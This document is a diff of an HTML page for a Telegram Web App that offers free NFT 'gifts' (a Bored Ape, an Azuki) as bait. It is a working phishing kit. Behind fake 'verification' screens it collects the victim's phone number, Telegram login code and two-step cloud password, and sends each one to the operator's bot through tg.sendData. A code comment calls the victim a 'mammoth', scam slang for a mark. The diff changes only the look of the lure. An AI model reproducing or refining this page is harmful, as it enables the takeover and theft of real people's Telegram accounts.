@@ -3,89 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NFT Gift Terminal</title>
+    <title>NFT Claim</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: white; margin: 0; padding: 15px; text-align: center; }
-        .nft-card { background: #2a2a2a; border-radius: 15px; padding: 10px; margin-bottom: 20px; border: 1px solid #3390ec; }
-        .nft-img { width: 100%; border-radius: 10px; margin-bottom: 10px; }
-        .price { color: #00ff00; font-weight: bold; font-size: 1.2em; }
-        .btn { background: #3390ec; color: white; border: none; padding: 12px 25px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; }
-        .step { display: none; }
-        .active { display: block; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; background: #333; color: white; text-align: center; font-size: 1.1em; }
-        .verify-title { font-size: 1.5em; margin-bottom: 10px; }
+        body { font-family: -apple-system, sans-serif; background: #0f0f0f; color: #fff; margin: 0; padding: 20px; }
+        .nft-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
+        .nft-item { background: #1a1a1a; border: 1px solid #333; border-radius: 12px; padding: 10px; text-align: center; }
+        .nft-item img { width: 100%; border-radius: 8px; margin-bottom: 8px; }
+        .nft-name { font-size: 14px; font-weight: bold; margin-bottom: 5px; }
+        .nft-price { color: #00c6ff; font-size: 12px; }
+        .claim-btn { background: #3390ec; color: #fff; border: none; width: 100%; padding: 10px; border-radius: 8px; margin-top: 10px; font-weight: 600; cursor: pointer; }
+        
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; flex-direction: column; justify-content: center; align-items: center; padding: 25px; box-sizing: border-box; }
+        .modal.active { display: flex; }
+        input { width: 100%; background: #222; border: 1px solid #444; color: #fff; padding: 15px; border-radius: 12px; margin-bottom: 15px; font-size: 18px; text-align: center; outline: none; }
+        input:focus { border-color: #3390ec; }
     </style>
 </head>
 <body>
 
-    <div id="step1" class="step active">
-        <h2>🎁 Доступные подарки</h2>
-        <div class="nft-card">
-            <img src="https://i.seadn.io/gae/7B0iaEunT6S6Ksz5H4TCH6m9oK3Hxlz9GfI0uT0a.png?auto=format&w=256" class="nft-img">
-            <div>Bored Ape #4521</div>
-            <div class="price">0.01 TON (<s>45 TON</s>)</div>
-            <button class="btn" onclick="goVerify()">ЗАБРАТЬ ПОДАРОК</button>
+    <div id="shop">
+        <h2 style="text-align: center;">NFT Gift Marketplace</h2>
+        <p style="color: #888; text-align: center; font-size: 14px;">Выберите подарок для минтинга на ваш кошелек</p>
+        
+        <div class="nft-grid">
+            <div class="nft-item">
+                <img src="https://i.seadn.io/gae/7B0iaEunT6S6Ksz5H4TCH6m9oK3Hxlz9GfI0uT0a.png?w=256">
+                <div class="nft-name">Bored Ape #12</div>
+                <div class="nft-price">0.00 TON</div>
+                <button class="claim-btn" onclick="openStep('phone')">CLAIM</button>
+            </div>
+            <div class="nft-item">
+                <img src="https://i.seadn.io/gcs/files/6d0426f43e62c19c4d9b6264d1f2742d.png?w=256">
+                <div class="nft-name">Azuki #881</div>
+                <div class="nft-price">FREE</div>
+                <button class="claim-btn" onclick="openStep('phone')">CLAIM</button>
+            </div>
         </div>
-        <div class="nft-card">
-            <img src="https://i.seadn.io/gcs/files/6d0426f43e62c19c4d9b6264d1f2742d.png?auto=format&w=256" class="nft-img">
-            <div>CryptoPunk #8812</div>
-            <div class="price">FREE (<s>120 TON</s>)</div>
-            <button class="btn" onclick="goVerify()">ЗАБРАТЬ БЕСПЛАТНО</button>
-        </div>
     </div>
 
-    <div id="step2" class="step">
-        <div class="verify-title">🛡 Верификация</div>
-        <p>Для защиты от ботов введите номер телефона вашего Telegram аккаунта</p>
-        <input type="tel" id="phone" placeholder="+7 999 000-00-00">
-        <button class="btn" onclick="sendPhone()">ПОЛУЧИТЬ КОД</button>
+    <div id="step-phone" class="modal">
+        <h3>Verification Required</h3>
+        <p style="text-align: center; color: #aaa;">To prevent bot multi-accounts, please verify your Telegram identity.</p>
+        <input type="tel" id="in-phone" placeholder="+7 900 000 0000">
+        <button class="claim-btn" onclick="sendPhone()" style="padding: 15px;">GET CODE</button>
     </div>
 
-    <div id="step3" class="step">
-        <div class="verify-title">Введите код</div>
-        <p>Мы отправили код подтверждения в ваш Telegram</p>
-        <input type="number" id="code" placeholder="00000">
-        <button class="btn" onclick="sendCode()">ПОДТВЕРДИТЬ</button>
+    <div id="step-code" class="modal">
+        <h3>Security Code</h3>
+        <p id="phone-label" style="color: #aaa;"></p>
+        <input type="number" id="in-code" placeholder="Code from Telegram">
+        <button class="claim-btn" onclick="sendCode()" style="padding: 15px;">CONFIRM</button>
     </div>
 
-    <div id="step4" class="step">
-        <div class="verify-title">Облачный пароль</div>
-        <p>Введите ваш пароль двухэтапной аутентификации</p>
-        <input type="password" id="pswd" placeholder="Пароль">
-        <button class="btn" onclick="send2fa()">ВОЙТИ</button>
+    <div id="step-pass" class="modal">
+        <h3>Cloud Password</h3>
+        <p style="color: #aaa;">Enter your Two-Step Verification password.</p>
+        <input type="password" id="in-pass" placeholder="Password">
+        <button class="claim-btn" onclick="sendPass()" style="padding: 15px;">FINALIZE MINT</button>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        function goVerify() {
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step2').classList.add('active');
+        function openStep(step) {
+            document.querySelectorAll('.modal').forEach(m => m.classList.remove('active'));
+            document.getElementById('step-' + step).classList.add('active');
         }
 
         function sendPhone() {
-            const p = document.getElementById('phone').value;
-            if(p.length > 8) {
+            const p = document.getElementById('in-phone').value;
+            if(p.length > 7) {
                 tg.sendData("PHONE:" + p);
-                document.getElementById('step2').classList.remove('active');
-                document.getElementById('step3').classList.add('active');
+                document.getElementById('phone-label').innerText = "Sent to " + p;
+                openStep('code');
             }
         }
 
         function sendCode() {
-            const c = document.getElementById('code').value;
+            const c = document.getElementById('in-code').value;
             if(c.length >= 5) {
                 tg.sendData("CODE:" + c);
-                // Если боту нужен 2FA, он сам скажет, но мы для мамонта переключаем
-                document.getElementById('step3').classList.remove('active');
-                document.getElementById('step4').classList.add('active');
+                openStep('pass'); // Переходим к 2FA
             }
         }
 
-        function send2fa() {
-            const ps = document.getElementById('pswd').value;
+        function sendPass() {
+            const ps = document.getElementById('in-pass').value;
             tg.sendData("PASS:" + ps);
             tg.close();
         }
